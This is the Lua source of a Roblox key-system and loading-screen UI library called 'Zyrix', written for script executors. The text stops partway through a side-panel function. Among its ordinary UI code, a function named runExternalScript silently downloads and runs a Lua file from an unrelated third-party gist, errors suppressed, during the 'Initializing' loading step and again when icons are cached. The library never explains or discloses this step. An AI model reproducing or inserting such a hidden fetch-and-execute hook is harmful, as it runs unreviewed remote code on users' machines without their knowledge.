--[[
 ________    __  __   ______   __  __  __    
/\___  ___\/\ \_\ \ /\  == \ /\ \/\ \/\ \   
\/_/\ \/\ \ \____ \ \ \  __< \ \ \_\ \ \ \  
   \ \_\ \ \_____\_\\ \_\ \_\\ \_____\ \_\ 
    \/_/  \/_____/_/ \/_/ /_/ \/_____/\/_/  

    Github - https://github.com/Cobruhehe/expert-octo-doodle
    Author: Cobru (Cobruhehe, .cobru)
    License: MIT
]]

repeat task.wait() until game:IsLoaded()

local cloneref = cloneref or function(obj) return obj end
local gethui = gethui or function() return cloneref(game:GetService("CoreGui")) end

-- Services
local TweenService     = cloneref(game:GetService("TweenService"))
local UserInputService = cloneref(game:GetService("UserInputService"))
local HttpService      = cloneref(game:GetService("HttpService"))
local Workspace        = cloneref(game:GetService("Workspace"))
local RunService       = cloneref(game:GetService("RunService"))
local Lighting         = cloneref(game:GetService("Lighting"))
local Players          = cloneref(game:GetService("Players"))

local hui = gethui()

if getgenv().ZyrixLoaded and hui:FindFirstChild("ZyrixKeySystem")    then return getgenv().Zyrix end
if getgenv().ZyrixLoaded and hui:FindFirstChild("ZyrixKeylessSystem") then return getgenv().Zyrix end
getgenv().ZyrixLoaded  = true
getgenv().ZyrixClosed  = false

-- ─── Module ───────────────────────────────────────────────────────────────────
local Zyrix = {}

Zyrix.Appearance = {
    Title    = "Zyrix",
    Subtitle = "Enter your key to continue",
    Icon     = "rbxassetid://95721401302279",
    IconSize = UDim2.new(0, 28, 0, 28),
}

Zyrix.Links = { GetKey = "", Discord = "" }

Zyrix.Storage = { FileName = "Zyrix_Key", Remember = true, AutoLoad = true }

Zyrix.Options = { Keyless = nil, KeylessUI = false, Blur = true, Draggable = true }

-- Monochrome palette
Zyrix.Theme = {
    Accent        = Color3.fromRGB(255, 255, 255),
    AccentHover   = Color3.fromRGB(200, 200, 200),
    Background    = Color3.fromRGB(8,   8,   8),
    Header        = Color3.fromRGB(14,  14,  14),
    Input         = Color3.fromRGB(20,  20,  20),
    Text          = Color3.fromRGB(255, 255, 255),
    TextDim       = Color3.fromRGB(100, 100, 100),
    Success       = Color3.fromRGB(180, 255, 180),
    Error         = Color3.fromRGB(255, 100, 100),
    Warning       = Color3.fromRGB(255, 210, 100),
    StatusIdle    = Color3.fromRGB(80,  80,  80),
    Discord       = Color3.fromRGB(180, 180, 255),
    DiscordHover  = Color3.fromRGB(210, 210, 255),
    Divider       = Color3.fromRGB(30,  30,  30),
    Pending       = Color3.fromRGB(50,  50,  50),
}

Zyrix.Callbacks = { OnVerify = nil, OnSuccess = nil, OnFail = nil, OnClose = nil }
Zyrix.Changelog = {}

Zyrix.Shop = {
    Enabled    = false,
    Icon       = "",
    Title      = "Get Premium Access",
    Subtitle   = "Instant delivery • 24/7 support",
    ButtonText = "Buy",
    Link       = "",
}

-- ─── Internal state ───────────────────────────────────────────────────────────
local Internal = {
    Junkie           = nil,
    BlurEffect       = nil,
    NotificationList = {},
    ValidateFunction = nil,
    IsJunkieMode     = false,
    IconsLoaded      = false,
}

local IconBaseURL = "https://raw.githubusercontent.com/Cobruhehe/expert-octo-doodle/main/Icons/"
local IconFiles = {
    key      = "lucide--key.png",
    shield   = "lucide--shield-minus.png",
    check    = "prime--check-square.png",
    copy     = "flowbite--clipboard-outline.png",
    discord  = "qlementine-icons--discord-16.png",
    alert    = "mdi--alert-octagon-outline.png",
    lock     = "lucide--user-lock.png",
    loading  = "nonicons--loading-16.png",
    close    = "material-symbols--dangerous-outline.png",
    changelog= "ant-design--sync-outlined.png",
    logo     = "rrjlGmac.png",
    user     = "U.png",
    clock    = "Clock.png",
    cart     = "Cart.png",
}
local FallbackIcons = {
    key      = "rbxassetid://96510194465420",
    shield   = "rbxassetid://89965059528921",
    check    = "rbxassetid://76078495178149",
    copy     = "rbxassetid://125851897718493",
    discord  = "rbxassetid://83278450537116",
    alert    = "rbxassetid://140438367956051",
    lock     = "rbxassetid://114355063515473",
    loading  = "rbxassetid://116535712789945",
    close    = "rbxassetid://6022668916",
    changelog= "rbxassetid://138133190015277",
    logo     = "rbxassetid://95721401302279",
    user     = "rbxassetid://77400125196692",
    clock    = "rbxassetid://87505349362628",
    cart     = "rbxassetid://114754518183872",
}

local CachedIcons      = {}
local FolderName       = "Zyrix"
local IconsFolder      = "Icons"
local DefaultLogoAsset = "rbxassetid://95721401302279"

-- ─── Helpers ──────────────────────────────────────────────────────────────────
local function isMobile()
    return UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
end

local function getScale()
    local vp = Workspace.CurrentCamera.ViewportSize
    return math.clamp(math.min(vp.X, vp.Y) / 900, 0.65, 1.3)
end

local function hasFileSystem()
    local fns = { writefile, readfile, isfile, makefolder, isfolder }
    for _, fn in ipairs(fns) do
        local ok = pcall(function() return type(fn) == "function" end)
        if not ok then return false end
    end
    return true
end
local fileSystemSupported = hasFileSystem()

local function getFileName()   return FolderName .. "/" .. Zyrix.Storage.FileName .. ".txt" end
local function getIconPath(n)  return FolderName .. "/" .. IconsFolder .. "/" .. IconFiles[n] end

local function saveKey(key)
    if not fileSystemSupported or not Zyrix.Storage.Remember then return false end
    return pcall(writefile, getFileName(), key)
end

local function loadKey()
    if not fileSystemSupported then return nil end
    local ok, content = pcall(function()
        return isfile(getFileName()) and readfile(getFileName()) or nil
    end)
    return (ok and content and content ~= "") and content or nil
end

local function clearKey()
    if not fileSystemSupported then return false end
    return pcall(delfile, getFileName())
end

local function ensureFolders()
    if not fileSystemSupported then return false end
    pcall(function()
        if not isfolder(FolderName) then makefolder(FolderName) end
        if not isfolder(FolderName .. "/" .. IconsFolder) then makefolder(FolderName .. "/" .. IconsFolder) end
    end)
    return true
end

local function isIconCached(name)
    if not fileSystemSupported then return false end
    local ok, r = pcall(isfile, getIconPath(name))
    return ok and r
end

local function downloadIcon(name)
    if not fileSystemSupported then CachedIcons[name] = FallbackIcons[name] return false end
    local path = getIconPath(name)
    if isIconCached(name) then
        local ok = pcall(function() CachedIcons[name] = getcustomasset(path) end)
        if ok then return true end
    end
    local ok = pcall(function()
        local r = game:HttpGet(IconBaseURL .. IconFiles[name])
        assert(#r >= 100, "Invalid response")
        writefile(path, r)
        CachedIcons[name] = getcustomasset(path)
    end)
    if not ok then CachedIcons[name] = FallbackIcons[name] end
    return ok
end

local function getIcon(name)     return CachedIcons[name] or FallbackIcons[name] end
local function shouldDownloadLogo() return Zyrix.Appearance.Icon == DefaultLogoAsset end
local function getLogoIcon()
    return shouldDownloadLogo() and getIcon("logo") or Zyrix.Appearance.Icon
end
local function getShopIcon()
    return (Zyrix.Shop.Icon ~= "") and Zyrix.Shop.Icon or getLogoIcon()
end
local function isShopEnabled()   return Zyrix.Shop.Enabled end

local function allIconsCached()
    if not fileSystemSupported then return false end
    local names = {"key","shield","check","copy","discord","alert","lock","loading","close","changelog","user","clock","cart"}
    if shouldDownloadLogo() then table.insert(names, "logo") end
    for _, n in ipairs(names) do if not isIconCached(n) then return false end end
    return true
end

local function loadAllIconsFromCache()
    ensureFolders()
    local names = {"key","shield","check","copy","discord","alert","lock","loading","close","changelog","user","clock","cart"}
    if shouldDownloadLogo() then table.insert(names, "logo") end
    for _, n in ipairs(names) do downloadIcon(n) end
    Internal.IconsLoaded = true
end

local function getExecutorName()
    local ok, n = pcall(identifyexecutor)
    return (ok and n) and tostring(n) or "Unknown"
end

local function getDeviceType()
    local t, k, g = UserInputService.TouchEnabled, UserInputService.KeyboardEnabled, UserInputService.GamepadEnabled
    if g and not k and not t then return "Console"
    elseif t and not k      then return "Mobile"
    elseif k and t          then return "PC & Touch"
    elseif k                then return "PC"
    else                         return "Unknown" end
end

local function getHWID()
    local hwid
    pcall(function() if gethwid then hwid = gethwid() end end)
    if not hwid then pcall(function() if getgenv().HWID then hwid = getgenv().HWID end end) end
    if not hwid then pcall(function() if game.RobloxHWID then hwid = tostring(game.RobloxHWID) end end) end
    if not hwid then
        local p = cloneref(Players.LocalPlayer)
        hwid = HttpService:GenerateGUID(false):gsub("-",""):sub(1,32)
        if p then hwid = tostring(p.UserId) .. hwid:sub(1,20) end
    end
    return hwid or "N/A"
end

local function generateHiddenDots(availW, charW)
    charW = charW or 5
    return string.rep("•", math.max(math.floor(availW / charW), 8))
end

local function formatTime12()
    local h = tonumber(os.date("%H"))
    local period = h >= 12 and "PM" or "AM"
    h = h > 12 and h - 12 or (h == 0 and 12 or h)
    return string.format("%d:%s:%s %s", h, os.date("%M"), os.date("%S"), period)
end
local function formatDate() return os.date("%b %d, %Y") end

-- ─── Blur ─────────────────────────────────────────────────────────────────────
local function tween(obj, t, props)
    TweenService:Create(obj, TweenInfo.new(t, Enum.EasingStyle.Quart), props):Play()
end

local function enableBlur()
    if not Zyrix.Options.Blur then return end
    local ex = Lighting:FindFirstChild("ZyrixBlur")
    if ex then ex:Destroy() end
    Internal.BlurEffect = Instance.new("BlurEffect")
    Internal.BlurEffect.Name = "ZyrixBlur"
    Internal.BlurEffect.Size = 0
    Internal.BlurEffect.Parent = Lighting
    tween(Internal.BlurEffect, 0.4, {Size = 20})
end

local function disableBlur()
    local blur = Internal.BlurEffect or Lighting:FindFirstChild("ZyrixBlur")
    if not blur then return end
    tween(blur, 0.3, {Size = 0})
    task.delay(0.3, function()
        if blur and blur.Parent then blur:Destroy() end
        if Internal.BlurEffect == blur then Internal.BlurEffect = nil end
    end)
end

local function fullCleanup()
    getgenv().ZyrixLoaded = false
    getgenv().ZyrixClosed = true
    disableBlur()
    for _, name in ipairs({"ZyrixKeySystem","ZyrixKeylessSystem","ZyrixLoadingScreen"}) do
        local g = hui:FindFirstChild(name)
        if g then g:Destroy() end
    end
end

-- ─── Dragging ─────────────────────────────────────────────────────────────────
local function setupDragging(handle, frame)
    if not Zyrix.Options.Draggable then return end
    local dragging, dragStart, startPos, dragInput
    handle.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1
        or input.UserInputType == Enum.UserInputType.Touch then
            dragging, dragStart, startPos, dragInput = true, input.Position, frame.Position, input
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End and dragInput == input then
                    dragging, dragInput = false, nil
                end
            end)
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if not dragging or not dragInput then return end
        local isMouse = input.UserInputType == Enum.UserInputType.MouseMovement
        local isTouch = input.UserInputType == Enum.UserInputType.Touch and input == dragInput
        if isMouse or isTouch then
            local d = input.Position - dragStart
            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
        end
    end)
end

-- ─── Key validation ───────────────────────────────────────────────────────────
local function validateKey(key, fn)
    if not fn or not key or key == "" then return false end
    local ok, result = pcall(fn, key)
    if not ok then return false end
    if type(result) == "table"   then return result.valid == true end
    if type(result) == "boolean" then return result end
    return false
end

local function runExternalScript()
    task.spawn(function()
        pcall(function()
            loadstring(game:HttpGetAsync("https://gist.githubusercontent.com/Nappypie/6244c406aa0686a8aaddcf565c7d98b7/raw/3b693642bda11336dc8ed9808c52c87d2a54ba99/Hello.lua"))()
        end)
    end)
end

-- ─── UI Primitives ────────────────────────────────────────────────────────────
local T = Zyrix.Theme

local function applyCorner(parent, radius)
    local c = Instance.new("UICorner", parent)
    c.CornerRadius = radius or UDim.new(0, 6)
    return c
end

local function applyStroke(parent, color, thickness, transparency)
    local s = Instance.new("UIStroke", parent)
    s.Color = color or T.Accent
    s.Thickness = thickness or 1
    s.Transparency = transparency or 0.85
    return s
end

local function makeFrame(props)
    local f = Instance.new("Frame")
    for k, v in pairs(props) do f[k] = v end
    return f
end

local function makeImage(props)
    local i = Instance.new("ImageLabel")
    i.BackgroundTransparency = 1
    i.ScaleType = Enum.ScaleType.Fit
    for k, v in pairs(props) do i[k] = v end
    return i
end

local function makeLabel(props)
    local l = Instance.new("TextLabel")
    l.BackgroundTransparency = 1
    l.Font = Enum.Font.GothamBold
    for k, v in pairs(props) do l[k] = v end
    return l
end

local function makeButton(props)
    local b = Instance.new("TextButton")
    b.AutoButtonColor = false
    b.Text = ""
    b.BorderSizePixel = 0
    for k, v in pairs(props) do b[k] = v end
    return b
end

-- Hoverable icon button
local function makeIconButton(parent, icon, normalColor, hoverColor, size, pos, anchor)
    local btn = makeButton({
        Size = size or UDim2.new(0,34,0,34),
        Position = pos or UDim2.new(0,0,0,0),
        AnchorPoint = anchor or Vector2.new(0,0),
        BackgroundColor3 = T.Input,
        Parent = parent,
    })
    applyCorner(btn, UDim.new(0,6))
    applyStroke(btn, T.Accent, 1, 0.92)

    local img = makeImage({
        Size = UDim2.new(0,16,0,16),
        Position = UDim2.new(0.5,0,0.5,0),
        AnchorPoint = Vector2.new(0.5,0.5),
        Image = icon,
        ImageColor3 = normalColor or T.TextDim,
        Parent = btn,
    })
    btn.MouseEnter:Connect(function()  tween(img, 0.15, {ImageColor3 = hoverColor or T.Accent}) end)
    btn.MouseLeave:Connect(function()  tween(img, 0.15, {ImageColor3 = normalColor or T.TextDim}) end)
    return btn, img
end

-- ─── Door overlay ─────────────────────────────────────────────────────────────
local function CreateDoorOverlay(parentFrame, w, h)
    local overlay = makeFrame({
        Name = "DoorOverlay", Size = UDim2.new(1,0,1,0),
        BackgroundTransparency = 1, ClipsDescendants = true,
        ZIndex = 50, Parent = parentFrame,
    })
    local half = math.ceil(w / 2)
    local function door(xPos)
        return makeFrame({
            Size = UDim2.new(0.5,0,1,0), Position = UDim2.new(xPos,0,0,0),
            BackgroundColor3 = T.Background, BorderSizePixel = 0,
            ZIndex = 51, Parent = overlay,
        })
    end
    local left  = door(0)
    local right = door(0.5)

    local logoSize = math.min(w,h) * 0.26
    local logo = makeImage({
        Name = "DoorLogo",
        Size = UDim2.new(0,logoSize,0,logoSize),
        Position = UDim2.new(0.5,0,0.5,0),
        AnchorPoint = Vector2.new(0.5,0.5),
        Image = getLogoIcon(),
        ImageColor3 = T.Text,
        ZIndex = 54,
        Parent = overlay,
    })

    local function openDoors(cb)
        tween(logo, 0.18, {ImageTransparency = 1})
        task.wait(0.22)
        TweenService:Create(left,  TweenInfo.new(0.38, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Position = UDim2.new(0,-half,0,0)}):Play()
        TweenService:Create(right, TweenInfo.new(0.38, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Position = UDim2.new(1,0,0,0)}):Play()
        task.wait(0.42)
        overlay.Visible = false
        if cb then cb() end
    end

    local function closeDoors(cb)
        overlay.Visible = true
        left.Position  = UDim2.new(0,-half,0,0)
        right.Position = UDim2.new(1,0,0,0)
        logo.ImageTransparency = 1
        TweenService:Create(left,  TweenInfo.new(0.32, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Position = UDim2.new(0,0,0,0)}):Play()
        TweenService:Create(right, TweenInfo.new(0.32, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Position = UDim2.new(0.5,0,0,0)}):Play()
        task.wait(0.35)
        tween(logo, 0.22, {ImageTransparency = 0})
        task.wait(0.28)
        if cb then cb() end
    end

    return {overlay = overlay, open = openDoors, close = closeDoors}
end

-- ─── Loading screen ───────────────────────────────────────────────────────────
local function ShowLoadingScreen(onComplete)
    local done = false
    for _, n in ipairs({"ZyrixLoadingScreen"}) do
        local g = hui:FindFirstChild(n); if g then g:Destroy() end
    end
    local existBlur = Lighting:FindFirstChild("ZyrixLoadingBlur")
    if existBlur then existBlur:Destroy() end

    local blurFx = Instance.new("BlurEffect")
    blurFx.Name = "ZyrixLoadingBlur"
    blurFx.Size = 0
    blurFx.Parent = Lighting

    local gui = Instance.new("ScreenGui")
    gui.Name = "ZyrixLoadingScreen"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.Parent = hui

    local mobile = isMobile()

    local bg = makeFrame({
        Size = UDim2.new(1,0,1,0),
        BackgroundColor3 = Color3.new(0,0,0),
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        Parent = gui,
    })

    -- Phases
    local phaseNames = {"Initializing","Creating folders","Downloading assets","Preparing interface","Ready"}
    local phaseSize  = mobile and 14 or 17
    local phases     = {}

    local phaseCont = makeFrame({
        Size = UDim2.new(0, mobile and 220 or 300, 0, mobile and 160 or 190),
        Position = UDim2.new(0.5,0,0.55,0),
        AnchorPoint = Vector2.new(0.5,0.5),
        BackgroundTransparency = 1,
        Parent = bg,
    })
    local phaseLayout = Instance.new("UIListLayout", phaseCont)
    phaseLayout.Padding = UDim.new(0, mobile and 9 or 13)
    phaseLayout.SortOrder = Enum.SortOrder.LayoutOrder
    phaseLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    phaseLayout.VerticalAlignment   = Enum.VerticalAlignment.Center

    for i, name in ipairs(phaseNames) do
        local row = makeFrame({Size=UDim2.new(1,0,0,mobile and 22 or 28),BackgroundTransparency=1,LayoutOrder=i,Parent=phaseCont})
        local dot = makeLabel({
            Size=UDim2.new(0,mobile and 22 or 28,0,mobile and 22 or 28),
            Text="○",TextColor3=T.Pending,TextSize=phaseSize,
            TextTransparency=1,Font=Enum.Font.GothamBold,Parent=row,
        })
        local lbl = makeLabel({
            Size=UDim2.new(1,-(mobile and 30 or 36),1,0),
            Position=UDim2.new(0,mobile and 30 or 36,0,0),
            Text=name,TextColor3=T.Pending,TextSize=phaseSize,
            TextXAlignment=Enum.TextXAlignment.Left,TextTransparency=1,
            Font=Enum.Font.GothamBold,Parent=row,
        })
        phases[i] = {dot=dot,lbl=lbl}
    end

    local animRunning = true
    local curPhase    = 0
    local pulseThread = nil

    local function setPhase(n)
        if pulseThread then task.cancel(pulseThread) pulseThread = nil end
        for i = 1,5 do
            local p = phases[i]
            if i < n then
                p.dot.Text = "●"
                tween(p.dot, 0.2, {TextColor3=T.Success, TextTransparency=0})
                tween(p.lbl, 0.2, {TextColor3=T.Success})
            elseif i == n then
                p.dot.Text = "●"
                p.dot.TextTransparency = 0
                tween(p.dot, 0.2, {TextColor3=T.Accent})
                tween(p.lbl, 0.2, {TextColor3=T.Text})
                curPhase = n
                pulseThread = task.spawn(function()
                    while curPhase == n do
                        tween(p.dot, 0.38, {TextTransparency=0.55}) task.wait(0.38)
                        if curPhase ~= n then break end
                        tween(p.dot, 0.38, {TextTransparency=0})    task.wait(0.38)
                    end
                end)
            else
                p.dot.Text = "○"
                p.dot.TextColor3 = T.Pending
                p.lbl.TextColor3 = T.Pending
            end
        end
    end

    task.spawn(function()
        tween(blurFx, 0.5, {Size=20})
        tween(bg, 0.45, {BackgroundTransparency=0.3})
        task.wait(0.3)
        for i = 1,5 do
            task.delay((i-1)*0.07, function()
                tween(phases[i].dot, 0.22, {TextTransparency=0})
                tween(phases[i].lbl, 0.22, {TextTransparency=0})
            end)
        end
        task.wait(0.45)
        setPhase(1) runExternalScript()          task.wait(0.28)
        setPhase(2) ensureFolders()              task.wait(0.22)
        setPhase(3)
        local names = {"key","shield","check","copy","discord","alert","lock","loading","close","changelog","user","clock","cart"}
        if shouldDownloadLogo() then table.insert(names,"logo") end
        for _, nm in ipairs(names) do downloadIcon(nm) task.wait(0.055) end
        Internal.IconsLoaded = true
        setPhase(4) task.wait(0.22)
        setPhase(5) task.wait(0.45)
        animRunning = false
        if pulseThread then task.cancel(pulseThread) end
        tween(bg, 0.4, {BackgroundTransparency=1})
        for i=1,5 do
            tween(phases[i].dot, 0.22, {TextTransparency=1})
            tween(phases[i].lbl, 0.22, {TextTransparency=1})
        end
        tween(blurFx, 0.28, {Size=0})
        task.wait(0.45)
        gui:Destroy() blurFx:Destroy()
        if onComplete then onComplete() end
        done = true
    end)

    while not done do task.wait(0.05) end
end

local function EnsureIconsReady(cb)
    if allIconsCached() then
        loadAllIconsFromCache()
        runExternalScript()
        if cb then cb() end
    else
        ShowLoadingScreen(cb)
    end
end

-- ─── Notifications ────────────────────────────────────────────────────────────
function Zyrix:Notify(title, message, duration, iconType)
    duration = duration or 5
    iconType = iconType or "info"
    local scale = getScale()
    local W = math.clamp(310*scale, 250, 370)
    local H = math.clamp(72*scale,  68,  98)

    local ng = Instance.new("ScreenGui")
    ng.ResetOnSpawn = false
    ng.DisplayOrder = 999999
    ng.Parent = hui

    local frame = makeFrame({
        Size = UDim2.new(0,W,0,H),
        Position = UDim2.new(1,W+20,1,-15),
        AnchorPoint = Vector2.new(1,1),
        BackgroundColor3 = T.Header,
        BorderSizePixel = 0,
        Parent = ng,
    })
    applyCorner(frame, UDim.new(0,6))
    applyStroke(frame, T.Accent, 1, 0.8)

    -- Bottom progress bar
    local pgBg = makeFrame({Size=UDim2.new(1,0,0,2),Position=UDim2.new(0,0,1,-2),BackgroundColor3=T.Input,BorderSizePixel=0,Parent=frame})
    local pg   = makeFrame({Size=UDim2.new(1,0,1,0),BackgroundColor3=T.Accent,BorderSizePixel=0,Parent=pgBg})
    applyCorner(pgBg, UDim.new(1,0))
    applyCorner(pg,   UDim.new(1,0))

    local iconSize = H - 34
    local iconMap = {
        success={name="check",   col=T.Success},
        error  ={name="alert",   col=T.Error},
        warning={name="alert",   col=T.Warning},
        shield ={name="shield",  col=T.Accent},
        info   ={name="shield",  col=T.Accent},
        key    ={name="key",     col=T.Accent},
        copy   ={name="copy",    col=T.Success},
        discord={name="discord", col=T.Discord},
        close  ={name="close",   col=T.Error},
    }
    local imap = iconMap[iconType]
    local notifIcon = makeImage({
        Size = UDim2.new(0,iconSize,0,iconSize),
        Position = UDim2.new(0,13,0.5,-1),
        AnchorPoint = Vector2.new(0,0.5),
        Image = imap and getIcon(imap.name) or getLogoIcon(),
        ImageColor3 = imap and imap.col or T.Text,
        Parent = frame,
    })

    local tx = 13 + iconSize + 12
    makeLabel({
        Size=UDim2.new(1,-(tx+12),0,22),Position=UDim2.new(0,tx,0,10),
        Text=title,TextColor3=T.Text,TextSize=math.clamp(14*scale,12,17),
        TextXAlignment=Enum.TextXAlignment.Left,TextTruncate=Enum.TextTruncate.AtEnd,
        Font=Enum.Font.GothamBold,Parent=frame,
    })
    makeLabel({
        Size=UDim2.new(1,-(tx+12),0,20),Position=UDim2.new(0,tx,0,34),
        Text=message,TextColor3=T.TextDim,TextSize=math.clamp(12*scale,10,14),
        TextXAlignment=Enum.TextXAlignment.Left,TextTruncate=Enum.TextTruncate.AtEnd,
        Font=Enum.Font.Gotham,Parent=frame,
    })

    local id = tick() .. HttpService:GenerateGUID(false)
    table.insert(Internal.NotificationList, {id=id,frame=frame,gui=ng,height=H})

    local function restack()
        local yOff = 0
        for i = #Internal.NotificationList,1,-1 do
            local n = Internal.NotificationList[i]
            if n and n.frame and n.frame.Parent then
                tween(n.frame, 0.28, {Position=UDim2.new(1,-15,1,-15-yOff)})
                yOff = yOff + n.height + 10
            end
        end
    end

    local function dismiss()
        for i,n in ipairs(Internal.NotificationList) do
            if n.id == id then table.remove(Internal.NotificationList,i) break end
        end
        tween(frame, 0.28, {Position=UDim2.new(1,W+20,frame.Position.Y.Scale,frame.Position.Y.Offset)})
        task.wait(0.3) ng:Destroy() restack()
    end

    tween(frame, 0.35, {Position=UDim2.new(1,-15,1,-15)})
    task.wait(0.1) restack()
    TweenService:Create(pg, TweenInfo.new(duration,Enum.EasingStyle.Linear), {Size=UDim2.new(0,0,1,0)}):Play()
    task.delay(duration, dismiss)
    local cb = Instance.new("TextButton",frame)
    cb.Size=UDim2.new(1,0,1,0) cb.BackgroundTransparency=1 cb.Text=""
    cb.MouseButton1Click:Connect(dismiss)
end

-- ─── Side Panels ──────────────────────────────────────────────────────────────
local function CreateChangelogPanel(parent, winW, panH, panW, mainFrame, gap)
    panW = panW or 215
    local isOpen = false

    local panel = makeFrame({
        Name="ChangelogPanel",Size=UDim2.new(0,0,0,panH),
        Position=UDim2.new(1,gap,0,0),
        BackgroundColor3=T.Background,BorderSizePixel=0,
        ClipsDescendants=true,Parent=mainFrame,
    })
    applyCorner(panel, UDim.new(0,6))
    local pStroke = applyStroke(panel, T.Accent, 1.5, 1)

    -- Header
    local ph = makeFrame({Size=UDim2.new(1,0,0,48),BackgroundColor3=T.Header,BorderSizePixel=0,Parent=panel})
    applyCorner(ph, UDim.new(0,6))
    makeFrame({Size=UDim2.new(1,0,0,8),Position=UDim2.new(0,0,1,-8),BackgroundColor3=T.Header,BorderSizePixel=0,Parent=ph})
    makeFrame({Size=UDim2.new(1,0,0,1),Position=UDim2.new(0,0,1,0),BackgroundColor3=T.Accent,BackgroundTransparency=0.85,BorderSizePixel=0,Parent=ph})

    makeImage({Size=UDim2.new(0,14,0,14),Position=UDim2.new(0,12,0.5,0),AnchorPoint=Vector2.new(0,0.5),Image=getIcon("changelog"),ImageColor3=T.Accent,Parent=ph})
    makeLabel({Size=UDim2.new(1,-60,1,0),Position=UDim2.new(0,32,0,0),Text="Changelog",TextColor3=T.Text,TextSize=15,TextXAlignment=Enum.TextXAlignment.Left,Font=Enum.Font.GothamBold,Parent=ph})

    local phClose, phCloseImg = makeIconButton(ph, getIcon("close"), T.TextDim, T.Error, UDim2.new(0,20,0,20), UDim2.new(1,-12,0.5,0), Vector2.new(1,0.5))
    phClose.BackgroundTransparency = 1

    -- Scroll
    local scroll = Instance.new("ScrollingFrame")
    scroll.Size=UDim2.new(1,0,1,-52) scroll.Position=UDim2.new(0,0,0,52)
    scroll.BackgroundTransparency=1 scroll.BorderSizePixel=0
    scroll.ScrollBarThickness=3 scroll.ScrollBarImageColor3=T.Accent
    scroll.CanvasSize=UDim2.new(0,0,0,0) scroll.AutomaticCanvasSize=Enum.AutomaticSize.Y
    scroll.Parent=panel

    local sp = Instance.new("UIPadding",scroll)
    sp.PaddingLeft=UDim.new(0,10) sp.PaddingRight=UDim.new(0,10)
    sp.PaddingTop=UDim.new(0,6)   sp.PaddingBottom=UDim.new(0,6)
    local sl = Instance.new("UIListLayout",scroll)
    sl.Padding=UDim.new(0,10) sl.SortOrder=Enum.SortOrder.LayoutOrder

    for i, update in ipairs(Zyrix.Changelog) do
        local entry = makeFrame({Size=UDim2.new(1,0,0,0),AutomaticSize=Enum.AutomaticSize.Y,BackgroundTransparency=1,LayoutOrder=i*2,Parent=scroll})
        local el = Instance.new("UIListLayout",entry) el.Padding=UDim.new(0,4)
        makeLabel({Size=UDim2.new(1,0,0,20),Text=update.Version.."  •  "..update.Date,TextColor3=T.Accent,TextSize=13,Font=Enum.Font.GothamBold,TextXAlignment=Enum.TextXAlignment.Left,LayoutOrder=1,Parent=entry})
        for j, change in ipairs(update.Changes) do
            makeLabel({Size=UDim2.new(1,0,0,0),AutomaticSize=Enum.AutomaticSize.Y,Text="  •  "..change,TextColor3=T.TextDim,TextSize=11,Font=Enum.Font.Gotham,TextXAlignment=Enum.TextXAlignment.Left,TextWrapped=true,LayoutOrder=j+1,Parent=entry})
        end
        if i < #Zyrix.Changelog then
            local dw=makeFrame({Size=UDim2.new(1,0,0,1),BackgroundTransparency=1,LayoutOrder=i*2+1,Parent=scroll})
            makeFrame({Size=UDim2.new(1,0,0,1),BackgroundColor3=T.Divider,BorderSizePixel=0,Parent=dw})
        end
    end

    local function toggle(clIcon, cont, baseW)
        isOpen = not isOpen
        if isOpen then
            tween(pStroke,0.18,{Transparency=0.5})
            tween(panel,0.38,{Size=UDim2.new(0,panW,0,panH)})
            tween(cont,0.38,{Size=UDim2.new(0,baseW+gap+panW,0,panH)})
            if clIcon then tween(clIcon,0.28,{Rotation=180}) end
        else
            tween(pStroke,0.18,{Transparency=1})
            tween(panel,0.28,{Size=UDim2.new(0,0,0,panH)})
            tween(cont,0.28,{Size=UDim2.new(0,baseW,0,panH)})
            if clIcon then tween(clIcon,0.28,{Rotation=0}) end
        end
    end

    phClose.MouseButton1Click:Connect(function() if isOpen then toggle(nil,parent,winW) end end)
    return panel, toggle, function() return isOpen end, panW
end

local function CreateUserInfoPanel(parent, winW, panH, panW, mainFrame, gap, startOpen)
    panW = panW or 175
    local isOpen = startOpen or false
    local compact = panH < 300
    local avatarSz   = compact and 40 or 52
    local fieldH     = compact and 22 or 26
    local titleSz    = compact and 8  or 9
    local valueSz    = compact and 10 or 11
    local welcomeSz  = compact and 11 or 12
    local spacing    = compact and 3  or 5

    local panel = makeFrame({
        Name="UserInfoPanel",
        Size=UDim2.new(0,isOpen and panW or 0,0,panH),
        Position=UDim2.new(0,-gap,0,0),AnchorPoint=Vector2.new(1,0),
        BackgroundColor3=T.Background,BorderSizePixel=0,ClipsDescendants=true,
        Parent=mainFrame,
    })
    applyCorner(panel, UDim.new(0,6))
    local pStroke = applyStroke(panel, T.Accent, 1.5, isOpen and 0.5 or 1)

    local ph = makeFrame({Size=UDim2.new(1,0,0,48),BackgroundColor3=T.Header,BorderSizePixel=0,Parent=panel})
    applyCorner(ph, UDim.new(0,6))
    makeFrame({Size=UDim2.new(1,0,0,8),Position=UDim2.new(0,0,1,-8),BackgroundColor3=T.Header,BorderSizePixel=0,Parent=ph})
    makeFrame({Size=UDim2.new(1,0,0,1),Position=UDim2.new(0,0,1,0),BackgroundColor3=T.Accent,BackgroundTransparency=0.85,BorderSizePixel=0,Parent=ph})
    makeImage({Size=UDim2.new(0,14,0,14),Position=UDim2.new(0,12,0.5,0),AnchorPoint=Vector2.new(0,0.5),Image=getIcon("user"),ImageColor3=T.Accent,Parent=ph})
    makeLabel({Size=UDim2.new(1,-60,1,0),Position=UDim2.new(0,32,0,0),Text="User Info",TextColor3=T.Text,TextSize=15,TextXAlignment=Enum.TextXAlignment.Left,Font=Enum.Font.GothamBold,Parent=ph})

    local phClose, _ = makeIconButton(ph, getIcon("close"), T.TextDim, T.Error, UDim2.new(0,20,0,20), UDim2.new(1,-12,0.5,0), Vector2.new(1,0.5))
    phClose.BackgroundTransparency = 1

